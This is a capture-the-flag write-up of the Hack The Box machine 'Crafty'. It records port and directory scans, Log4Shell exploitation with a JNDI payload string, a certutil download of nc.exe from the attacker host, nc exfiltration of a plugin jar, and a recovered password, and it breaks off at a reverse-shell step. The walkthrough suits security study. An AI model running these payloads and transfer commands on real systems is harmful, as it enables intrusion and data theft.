@@ -1,0 +1,606 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-us" lang="en-us">
+<head>
+    
+
+
+
+
+
+
+
+
+
+
+    
+
+
+
+
+
+
+
+<script defer language="javascript" type="text/javascript" src="/js/bundle.min.60856f0f2ed73fb3cd2820ee548c4698ffbc4d743736e852c0e27ce4f52dfd9c.js"></script>
+
+
+
+
+
+
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    
+    <link rel="icon" href=/favicon.png>
+
+    
+    
+
+
+
+
+
+  
+
+
+
+
+
+  
+  
+  
+
+
+<!-- Open Graph image and Twitter Card metadata -->
+
+<title itemprop="name">sysevil - Crafty</title>
+<meta property="og:title" content=sysevil&#32;-&#32;Crafty />
+<meta name="twitter:title" content=sysevil&#32;-&#32;Crafty />
+<meta itemprop="name" content=sysevil&#32;-&#32;Crafty />
+<meta name="application-name" content=sysevil&#32;-&#32;Crafty />
+<meta property="og:site_name" content="" />
+
+
+<meta name="description" content="" />
+<meta itemprop="description" content="" />
+<meta property="og:description" content="" />
+<meta name="twitter:description" content="" />
+
+
+<base href="https://sysevil.github.io/htb/crafty/" />
+<link rel="canonical" href="https://sysevil.github.io/htb/crafty/" itemprop="url" />
+<meta name="url" content="https://sysevil.github.io/htb/crafty/" />
+<meta name="twitter:url" content="https://sysevil.github.io/htb/crafty/" />
+<meta property="og:url" content="https://sysevil.github.io/htb/crafty/" />
+
+
+<meta property="og:updated_time" content=15002-15-03T255:15:24-0300 />
+
+
+<link rel="sitemap" type="application/xml" title="Sitemap" href='https://sysevil.github.io/sitemap.xml' />
+
+<meta name="robots" content="index,follow" />
+<meta name="googlebot" content="index,follow" />
+
+
+<meta name="twitter:site" content="https://twitter.com/sys3vil" />
+<meta name="twitter:creator" content="https://twitter.com/sys3vil" />
+<meta property="fb:admins" content="" />
+
+
+<meta name="apple-mobile-web-app-title" content="" />
+<meta name="apple-mobile-web-app-capable" content="yes" />
+<meta name="apple-mobile-web-app-status-bar-style" content="black" />
+
+
+
+
+
+
+<meta name="generator" content=" ">
+
+
+    
+    
+
+<link type="text/css" rel="stylesheet" href="/css/bundle.min.94a339836f89f0d25f31980cb6b0631da21e20af128308747ce44e0525eb16ef.css">
+
+
+    
+    <style>
+    body {
+        --sidebar-bg-color: #202020;
+        --sidebar-img-border-color: #515151;
+        --sidebar-p-color: #909090;
+        --sidebar-h1-color: #FFF;
+        --sidebar-a-color: #FFF;
+        --sidebar-socials-color: #FFF;
+        --text-color: #222;
+        --bkg-color: #FAF9F6;
+        --post-title-color: #303030;
+        --list-color: #5A5A5A;
+        --link-color: #268BD2;
+        --date-color: #515151;
+        --table-border-color: #E5E5E5;
+        --table-stripe-color: #F9F9F9;
+        --code-color: #000;
+        --code-background-color: #E5E5E5;
+        --code-block-color: #FFF;
+        --code-block-background-color: #272822;
+        --moon-sun-color: #FFF;
+        --moon-sun-background-color: #515151;
+    }
+    body.dark-theme {
+        --text-color: #EEE;
+        --bkg-color: #121212;
+        --post-title-color: #DBE2E9;
+        --list-color: #9D9D9D;
+        --link-color: #268BD2;
+        --date-color: #9A9A9A;
+        --table-border-color: #515151;
+        --table-stripe-color: #202020;
+        --code-color: #FFF;
+        --code-background-color: #515151;
+        --code-block-color: #FFF;
+        --code-block-background-color: #272822;
+    }
+    body {
+        background-color: var(--bkg-color);
+    }
+</style>
+
+</head>
+
+    <body class="dark-theme">
+        <div class="wrapper">
+            <aside class="sidebar">
+    <div class="container sidebar-sticky">
+        <div class="light-dark" align="right">
+    <button class="btn-light-dark" title="Toggle light/dark mode">
+        <svg class="moon" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 16 16">
+            <path fill="currentColor" d="M6 .278a.768.768 0 0 1 .08.858a7.208 7.208 0 0 0-.878 3.46c0 4.021 3.278 7.277 7.318 7.277c.527 0 1.04-.055 1.533-.16a.787.787 0 0 1 .81.316a.733.733 0 0 1-.031.893A8.349 8.349 0 0 1 8.344 16C3.734 16 0 12.286 0 7.71C0 4.266 2.114 1.312 5.124.06A.752.752 0 0 1 6 .278z"/>
+        </svg>
+        <svg class="sun" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 16 16">
+            <path fill="currentColor" d="M8 12a4 4 0 1 0 0-8a4 4 0 0 0 0 8zM8 0a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 0zm0 13a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 13zm8-5a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2a.5.5 0 0 1 .5.5zM3 8a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2A.5.5 0 0 1 3 8zm10.657-5.657a.5.5 0 0 1 0 .707l-1.414 1.415a.5.5 0 1 1-.707-.708l1.414-1.414a.5.5 0 0 1 .707 0zm-9.193 9.193a.5.5 0 0 1 0 .707L3.05 13.657a.5.5 0 0 1-.707-.707l1.414-1.414a.5.5 0 0 1 .707 0zm9.193 2.121a.5.5 0 0 1-.707 0l-1.414-1.414a.5.5 0 0 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .707zM4.464 4.465a.5.5 0 0 1-.707 0L2.343 3.05a.5.5 0 1 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .708z"/>
+        </svg>
+    </button>
+</div>
+
+        <div class="sidebar-about">
+    <h1 class="brand">
+        
+            <a href="https://sysevil.github.io">
+                <img src="https://avatars.githubusercontent.com/u/101719434?s=400&amp;u=42dd79d45b84aeba378d735e6b54c8e5e1b92316&amp;v=4" alt="brand image">
+            </a>
+        
+        
+            <a href="https://sysevil.github.io">
+                <h1>sysevil</h1>
+            </a>
+        
+    </h1>
+    <p class="lead">
+    I am a (security|dev) researcher focus on 👁️🪲
+    </p>
+</div>
+
+        <nav>
+    <ul class="sidebar-nav">
+
+        
+        
+        
+        
+            
+
+            
+                
+                
+            
+                
+                
+            
+            
+                
+                
+            
+                
+                
+            
+        
+        
+            
+
+            
+                
+                
+            
+                
+                
+                    <li class="heading">
+                        <a href="/posts/">Posts</a>
+                    </li>
+                    
+                        <li class="sub-heading">
+                            Recent
+                        </li>
+                        
+                            <li class="bullet">
+                                <a href="https://sysevil.github.io/posts/analysis-joomla-cve-2023-23752/">Analysis of Joomla CVE-2023-23752</a>
+                            </li>
+                        
+                    
+                
+            
+            
+                
+                
+            
+                
+                
+            
+        
+        
+            
+
+            
+                
+                
+                    <li class="heading">
+                        <a href="/htb/">HTB</a>
+                    </li>
+                    
+                        <li class="sub-heading">
+                            Recent
+                        </li>
+                        
+                            <li class="bullet">
+                                <a href="https://sysevil.github.io/htb/crafty/">Crafty</a>
+                            </li>
+                        
+                            <li class="bullet">
+                                <a href="https://sysevil.github.io/htb/twomillion/">Twomillion</a>
+                            </li>
+                        
+                            <li class="bullet">
+                                <a href="https://sysevil.github.io/htb/devvortex/">Devvortex</a>
+                            </li>
+                        
+                            <li class="bullet">
+                                <a href="https://sysevil.github.io/htb/busqueda/">Busqueda</a>
+                            </li>
+                        
+                            <li class="bullet">
+                                <a href="https://sysevil.github.io/htb/builder/">Builder</a>
+                            </li>
+                        
+                    
+                
+            
+                
+                
+            
+            
+                
+                
+            
+                
+                
+            
+        
+        
+            
+
+            
+                
+                
+            
+                
+                
+            
+            
+                
+                
+            
+                
+                
+            
+        
+
+    </ul>
+</nav>
+
+        
+    <a target="_blank" class="social" title="GitHub" href="https://github.com/sysevil">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em" viewBox="-2 -2 24 24">
+            <path fill="currentColor" d="M18.88 1.099C18.147.366 17.265 0 16.233 0H3.746C2.714 0 1.832.366 1.099 1.099C.366 1.832 0 2.714 0 3.746v12.487c0 1.032.366 1.914 1.099 2.647c.733.733 1.615 1.099 2.647 1.099H6.66c.19 0 .333-.007.429-.02a.504.504 0 0 0 .286-.169c.095-.1.143-.245.143-.435l-.007-.885c-.004-.564-.006-1.01-.006-1.34l-.3.052c-.19.035-.43.05-.721.046a5.555 5.555 0 0 1-.904-.091a2.026 2.026 0 0 1-.872-.39a1.651 1.651 0 0 1-.572-.8l-.13-.3a3.25 3.25 0 0 0-.41-.663c-.186-.243-.375-.407-.566-.494l-.09-.065a.956.956 0 0 1-.17-.156a.723.723 0 0 1-.117-.182c-.026-.061-.004-.111.065-.15c.07-.04.195-.059.378-.059l.26.04c.173.034.388.138.643.311a2.1 2.1 0 0 1 .631.677c.2.355.44.626.722.813c.282.186.566.28.852.28c.286 0 .533-.022.742-.065a2.59 2.59 0 0 0 .585-.196c.078-.58.29-1.028.637-1.34a8.907 8.907 0 0 1-1.333-.234a5.314 5.314 0 0 1-1.223-.507a3.5 3.5 0 0 1-1.047-.872c-.277-.347-.505-.802-.683-1.365c-.177-.564-.266-1.215-.266-1.952c0-1.049.342-1.942 1.027-2.68c-.32-.788-.29-1.673.091-2.652c.252-.079.625-.02 1.119.175c.494.195.856.362 1.086.5c.23.14.414.257.553.352a9.233 9.233 0 0 1 2.497-.338c.859 0 1.691.113 2.498.338l.494-.312a6.997 6.997 0 0 1 1.197-.572c.46-.174.81-.221 1.054-.143c.39.98.424 1.864.103 2.653c.685.737 1.028 1.63 1.028 2.68c0 .737-.089 1.39-.267 1.957c-.177.568-.407 1.023-.689 1.366a3.65 3.65 0 0 1-1.053.865c-.42.234-.828.403-1.223.507a8.9 8.9 0 0 1-1.333.235c.45.39.676 1.005.676 1.846v3.11c0 .147.021.266.065.357a.36.36 0 0 0 .208.189c.096.034.18.056.254.064c.074.01.18.013.318.013h2.914c1.032 0 1.914-.366 2.647-1.099c.732-.732 1.099-1.615 1.099-2.647V3.746c0-1.032-.367-1.914-1.1-2.647z"/>
+        </svg>
+    </a>
+
+
+
+
+    <a target="_blank" class="social" title="Twitter" href="https://twitter.com/sys3vil">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em" viewBox="0 0 16 16">
+            <path fill="currentColor" d="M5.032 14.286c6.037 0 9.34-4.837 9.34-9.032c0-.137 0-.274-.01-.41A6.56 6.56 0 0 0 16 3.2c-.6.256-1.235.425-1.885.5a3.207 3.207 0 0 0 1.443-1.757c-.645.37-1.35.63-2.085.77a3.322 3.322 0 0 0-1.862-.958a3.384 3.384 0 0 0-2.082.334a3.223 3.223 0 0 0-1.442 1.49a3.08 3.08 0 0 0-.208 2.03a9.57 9.57 0 0 1-3.747-.963a9.269 9.269 0 0 1-3.018-2.354a3.086 3.086 0 0 0-.36 2.314c.189.787.68 1.475 1.376 1.924a3.344 3.344 0 0 1-1.49-.398v.04c0 .734.263 1.444.743 2.01a3.3 3.3 0 0 0 1.89 1.102c-.483.128-.99.146-1.482.055a3.19 3.19 0 0 0 1.168 1.577a3.36 3.36 0 0 0 1.9.627A6.732 6.732 0 0 1 0 12.86a9.527 9.527 0 0 0 5.032 1.423"/>
+        </svg>
+    </a>
+
+
+
+
+
+
+
+
+
+
+
+
+    <a target="_blank" class="social" title="RSS Feed" href="/posts/index.xml">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1.2em" viewBox="0 0 1280.000000 1280.000000">
+            <g transform="translate(0.000000,1280.000000) scale(0.100000,-0.100000)" fill="currentColor">
+                <path d="M2295 11929 c-284 -12 -642 -45 -707 -65 -17 -5 -18 -63 -18 -1039 0 -569 4 -1036 8 -1039 5 -3 74 6 153 19 510 86 1168 95 1789 25 1348 -153 2602 -677 3670 -1531 385 -308 820 -744 1126 -1129 842 -1060 1362 -2313 1514 -3650 70 -621 61 -1279 -25 -1789 -13 -79 -22 -148 -19 -153 3 -4 471 -8 1039 -8 l1035 0 5 23 c51 225 85 942 67 1419 -23 605 -77 1044 -198 1617 -294 1400 -927 2734 -1823 3846 -1043 1295 -2364 2259 -3909 2854 -1158 447 -2451 656 -3707 600z"/>
+                <path d="M2255 7845 c-269 -25 -620 -81 -667 -106 -17 -9 -18 -55 -18 -899 0 -706 3 -890 13 -890 6 0 66 18 132 41 130 44 288 79 467 105 154 21 577 30 749 15 1207 -107 2267 -823 2814 -1902 166 -327 268 -637 330 -1001 38 -227 48 -384 42 -662 -8 -348 -44 -590 -126 -831 -23 -66 -41 -126 -41 -132 0 -10 184 -13 890 -13 844 0 890 1 899 18 27 50 88 452 110 725 14 162 14 624 1 782 -59 703 -233 1323 -545 1945 -481 956 -1313 1788 -2270 2268 -620 310 -1239 483 -1940 542 -165 14 -669 10 -840 -5z"/>
+                <path d="M2519 3815 c-391 -66 -725 -336 -868 -703 -79 -201 -96 -462 -45 -677 83 -344 338 -641 666 -774 116 -47 205 -69 330 -80 412 -39 811 153 1040 500 193 292 240 648 128 981 -135 403 -492 699 -914 757 -100 14 -241 12 -337 -4z"/>
+            </g>
+        </svg>
+    </a>
+
+
+    <a target="_blank" class="social" title="Email" href="mailto://sysevil.sec@gmail.com">
+       <svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1.2em" viewBox="0 0 485.211 485.211">
+            <path fill="currentColor" d="M301.393,241.631L464.866,424.56H20.332l163.474-182.928l58.801,51.443L301.393,241.631z M462.174,60.651H23.027 l219.579,192.142L462.174,60.651z M324.225,221.67l160.986,180.151V80.792L324.225,221.67z M0,80.792v321.029L160.972,221.64 L0,80.792z"/>
+       </svg>
+    </a>
+
+
+        <p class="footnote">
+powered by <a target="_blank" href="https:// localhost"> </a> | sysevil
+    <br>
+    &copy; 2024 . All rights reserved.
+</p>
+
+  </div>
+</aside>
+
+            <main class="content container">
+                <div class="post">
+  <div class="info">
+  <h1 class="post-title">
+    <a href="https://sysevil.github.io/htb/crafty/">Crafty</a>
+  </h1>
+
+  <div class="headline">
+    <div>
+      
+      <time datetime=" 2024-02-15T15:55:15-0300" class="post-date">
+        February 15, 2024
+      </time>
+      
+      <span> - </span>
+      <span class="reading-time">
+        
+          
+        
+
+        <span>4 mins read</span>
+      </span>
+    </div>
+
+    
+  </div>
+
+  
+  
+
+  
+</div>
+
+  <p>author: sysevil</p>
+<hr>
+<p>OS: Windows
+Difficult: Easy
+ip: 10.10.11.249</p>
+<hr>
+<h4 id="port-scan">Port Scan</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p- -T4 --min-rate<span style="color:#f92672">=</span><span style="color:#ae81ff">10000</span> 10.10.11.249 -oG open_ports_full
+</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-02-15 13:34 -03
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.249 <span style="color:#f92672">(</span>10.10.11.249<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.13s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65533</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT      STATE SERVICE
+</span></span><span style="display:flex;"><span>80/tcp    open  http
+</span></span><span style="display:flex;"><span>25565/tcp open  minecraft
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 13.58 seconds
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -sV -sC -A  -p 80,25565 -T4 --min-rate<span style="color:#f92672">=</span><span style="color:#ae81ff">1000</span> 10.10.11.249 -oG open_ports_scan
+</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-02-15 13:36 -03
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.249 <span style="color:#f92672">(</span>10.10.11.249<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.13s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT      STATE SERVICE   VERSION
+</span></span><span style="display:flex;"><span>80/tcp    open  http      Microsoft IIS httpd 10.0
+</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-IIS/10.0
+</span></span><span style="display:flex;"><span>|_http-title: Did not follow redirect to http://crafty.htb
+</span></span><span style="display:flex;"><span>25565/tcp open  minecraft Minecraft 1.16.5 <span style="color:#f92672">(</span>Protocol: 127, Message: Crafty Server, Users: 0/100<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Warning: OSScan results may be unreliable because we could not find at least <span style="color:#ae81ff">1</span> open and <span style="color:#ae81ff">1</span> closed port
+</span></span><span style="display:flex;"><span>Device type: general purpose
+</span></span><span style="display:flex;"><span>Running <span style="color:#f92672">(</span>JUST GUESSING<span style="color:#f92672">)</span>: Microsoft Windows <span style="color:#ae81ff">2019</span> <span style="color:#f92672">(</span>89%<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Aggressive OS guesses: Microsoft Windows Server <span style="color:#ae81ff">2019</span> <span style="color:#f92672">(</span>89%<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>No exact OS matches <span style="color:#66d9ef">for</span> host <span style="color:#f92672">(</span>test conditions non-ideal<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Network Distance: <span style="color:#ae81ff">2</span> hops
+</span></span><span style="display:flex;"><span>Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>TRACEROUTE <span style="color:#f92672">(</span>using port 80/tcp<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>HOP RTT       ADDRESS
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span>   136.51 ms 10.10.14.1 <span style="color:#f92672">(</span>10.10.14.1<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2</span>   136.54 ms 10.10.11.249 <span style="color:#f92672">(</span>10.10.11.249<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 17.48 seconds
+</span></span></code></pre></div><blockquote>
+<p>Add the crafty.htb to /etc/hosts - <code>echo &quot;10.10.11.249 crafty.htb&quot; | sudo tee -a /etc/hosts </code></p>
+</blockquote>
+<h4 id="dir-scan">Dir Scan</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>dirsearch -u http://crafty.htb -e jsp,php,asp,aspx,md,yaml,ini,txt,yml,zip,tgz,gz,toml -x 404,500,403
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  _|. _ _  _  _  _ _|_    v0.4.3
+</span></span><span style="display:flex;"><span> <span style="color:#f92672">(</span>_<span style="color:#f92672">||</span>| _<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>/_<span style="color:#f92672">(</span>_<span style="color:#f92672">||</span> <span style="color:#f92672">(</span>_| <span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Extensions: jsp, php, asp, aspx, md, yaml, ini, txt, yml, zip, tgz, gz, toml | HTTP method: GET | Threads: <span style="color:#ae81ff">25</span>
+</span></span><span style="display:flex;"><span>Wordlist size: <span style="color:#ae81ff">15708</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Output File: /home/parallels/Documents/htb/machines/crafty/reports/http_crafty.htb/_24-02-15_13-47-38.txt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Target: http://crafty.htb/
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>13:47:38<span style="color:#f92672">]</span> Starting: 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>13:48:22<span style="color:#f92672">]</span> <span style="color:#ae81ff">301</span> -  145B  - /css  -&gt;  http://crafty.htb/css/                  
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>13:48:32<span style="color:#f92672">]</span> <span style="color:#ae81ff">301</span> -  145B  - /img  -&gt;  http://crafty.htb/img/                  
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>13:48:32<span style="color:#f92672">]</span> <span style="color:#ae81ff">301</span> -  145B  - /index.html  -&gt;  http://crafty.htb/home           
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>13:48:34<span style="color:#f92672">]</span> <span style="color:#ae81ff">301</span> -  144B  - /js  -&gt;  http://crafty.htb/js/      
+</span></span></code></pre></div><h4 id="vhost-fuzz">Vhost Fuzz</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ffuf -u http://crafty.htb -H <span style="color:#e6db74">&#34;Host: FUZZ.crafty.htb&#34;</span>  -w /usr/share/wordlists/amass/subdomains.lst -fw <span style="color:#ae81ff">9</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        /<span style="color:#e6db74">&#39;___\  /&#39;</span>___<span style="color:#ae81ff">\ </span>          /<span style="color:#960050;background-color:#1e0010">&#39;</span>___<span style="color:#ae81ff">\ </span>      
+</span></span><span style="display:flex;"><span>       /<span style="color:#ae81ff">\ \_</span>_/ /<span style="color:#ae81ff">\ \_</span>_/  __  __  /<span style="color:#ae81ff">\ \_</span>_/       
+</span></span><span style="display:flex;"><span>       <span style="color:#ae81ff">\ \ </span>,__<span style="color:#ae81ff">\\</span> <span style="color:#ae81ff">\ </span>,__<span style="color:#ae81ff">\/\ \/\ \ \ \ </span>,__<span style="color:#ae81ff">\ </span>     
+</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">\ \ \_</span>/ <span style="color:#ae81ff">\ \ \_</span>/<span style="color:#ae81ff">\ \ \_\ \ \ \ \_</span>/      
+</span></span><span style="display:flex;"><span>         <span style="color:#ae81ff">\ \_\ </span>  <span style="color:#ae81ff">\ \_\ </span> <span style="color:#ae81ff">\ \_</span>___/  <span style="color:#ae81ff">\ \_\ </span>      
+</span></span><span style="display:flex;"><span>          <span style="color:#ae81ff">\/</span>_/    <span style="color:#ae81ff">\/</span>_/   <span style="color:#ae81ff">\/</span>___/    <span style="color:#ae81ff">\/</span>_/       
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>       v2.1.0-dev
+</span></span><span style="display:flex;"><span>________________________________________________
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> :: Method           : GET
+</span></span><span style="display:flex;"><span> :: URL              : http://crafty.htb
+</span></span><span style="display:flex;"><span> :: Wordlist         : FUZZ: /usr/share/wordlists/amass/subdomains.lst
+</span></span><span style="display:flex;"><span> :: Header           : Host: FUZZ.crafty.htb
+</span></span><span style="display:flex;"><span> :: Follow redirects : false
+</span></span><span style="display:flex;"><span> :: Calibration      : false
+</span></span><span style="display:flex;"><span> :: Timeout          : <span style="color:#ae81ff">10</span>
+</span></span><span style="display:flex;"><span> :: Threads          : <span style="color:#ae81ff">40</span>
+</span></span><span style="display:flex;"><span> :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+</span></span><span style="display:flex;"><span> :: Filter           : Response words: <span style="color:#ae81ff">9</span>
+</span></span><span style="display:flex;"><span>________________________________________________
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>:: Progress: <span style="color:#f92672">[</span>8215/8215<span style="color:#f92672">]</span> :: Job <span style="color:#f92672">[</span>1/1<span style="color:#f92672">]</span> :: <span style="color:#ae81ff">297</span> req/sec :: Duration: <span style="color:#f92672">[</span>0:00:27<span style="color:#f92672">]</span> :: Errors: <span style="color:#ae81ff">0</span> ::
+</span></span></code></pre></div><h4 id="tech-stack">Tech Stack</h4>
+<ul>
+<li>minecraft Minecraft 1.16.5
+<ul>
+<li>The only CVE that i found was <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-35054" target="_blank">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-35054</a> (( Ryotak ))</li>
+</ul>
+</li>
+<li>I was looking for something related and found the video from John Hammond about log4j and minecraft <a href="https://www.youtube.com/watch?v=7qoPDq41xhQ" target="_blank">https://www.youtube.com/watch?v=7qoPDq41xhQ</a></li>
+<li>Web app have a reference to another subdomain <code>play.crafty.htb</code>
+<img src="/markdown-export-output-attachments/03eab218ec92a74404b385eab8522736.png" alt=""></li>
+<li>Add this <code>subdomain</code>to the <code>/etc/hosts/</code>file too.</li>
+<li>Communicate with <code>minecraft</code> client with <a href="https://github.com/ammaraskar/pyCraft" target="_blank">https://github.com/ammaraskar/pyCraft</a>
+<img src="/markdown-export-output-attachments/6dd9435e82fd1377ae43dd5164d1c3ad.png" alt=""></li>
+</ul>
+<h4 id="entry-point-log4j">Entry point log4j</h4>
+<ul>
+<li>Running the tool from <a href="https://github.com/kozmer/log4j-shell-poc" target="_blank">https://github.com/kozmer/log4j-shell-poc</a></li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 poc.py --userip 10.10.14.9 --webport <span style="color:#ae81ff">8000</span> --lport <span style="color:#ae81ff">9001</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> CVE: CVE-2021-44228
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Github repo: https://github.com/kozmer/log4j-shell-poc
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Exploit java class created success
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Setting up LDAP server
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Send me: <span style="color:#e6db74">${</span>jndi:ldap://10.10.14.9:1389/a<span style="color:#e6db74">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Starting Webserver on port <span style="color:#ae81ff">8000</span> http://0.0.0.0:8000
+</span></span></code></pre></div><ul>
+<li>Getting the shell</li>
+</ul>
+<p><img src="/markdown-export-output-attachments/32e9d12edd28acbc6ac04bc370c84b3c.png" alt=""></p>
+<p><img src="/markdown-export-output-attachments/da23de2e27846356dc5c9cb720e7036f.png" alt=""></p>
+<h4 id="usertxt">user.txt</h4>
+<p><img src="/markdown-export-output-attachments/410f2c1180d921ec854258840db43253.png" alt=""></p>
+<h4 id="roottxt">root.txt</h4>
+<ul>
+<li>first verify if the <code>certutil.exe</code> was installed to retrieve and send files to the machine.</li>
+</ul>
+<p><img src="/markdown-export-output-attachments/d5ec4f12ab65c3d15390e73d4accfa82.png" alt=""></p>
+<ul>
+<li>With the windows bins from <code>kali</code> it&rsquo;s easy to send a copy of <code>nc.exe</code> to the machine</li>
+</ul>
+<p><img src="/markdown-export-output-attachments/23f8c0b95003cdae5f040360da1799c4.png" alt=""></p>
+<blockquote>
+<p>certutil.exe -urlcache -split -f http://10.10.14.9/nc.exe nc.exe nc.exe</p>
+</blockquote>
+<p><img src="/markdown-export-output-attachments/40635a58978f6595ea54e93111a81dac.png" alt=""></p>
+<ul>
+<li>Retrieve the plugin <code>playercounter-1.0-SNAPSHOT.jar</code></li>
+<li>Attacker machine: <code>nc -lp 9001 &gt; playercounter-1.0-SNAPSHOT.jar</code></li>
+<li>Victim machine: <code>C:\Users\svc_minecraft\Desktop\nc.exe 10.10.14.9 9004 &lt; C:\Users\svc_minecraft\server\plugins\playercounter-1.0-SNAPSHOT.jar</code></li>
+</ul>
+<p><img src="/markdown-export-output-attachments/ff840142624f28e3fef23dd83fab33d6.png" alt="">
+<img src="/markdown-export-output-attachments/aa567cb7da32bdcc6b48d1fa4118fcbe.png" alt=""></p>
+<ul>
+<li>Using jadx to get credentials - Jadx -  <a href="https://github.com/skylot/jadx/releases" target="_blank">https://github.com/skylot/jadx/releases</a></li>
+</ul>
+<p><img src="/markdown-export-output-attachments/c28765b8126bdc5e0dc09402e4f81489.png" alt=""></p>
+<blockquote>
+<p>s67u84zKq8IXw</p>
+</blockquote>
+<ul>
+<li>Using the following <code>powershell</code> trick you can create a small reverse shell in <code>powershell</code> and execute as <code>admin</code></li>
+</ul>
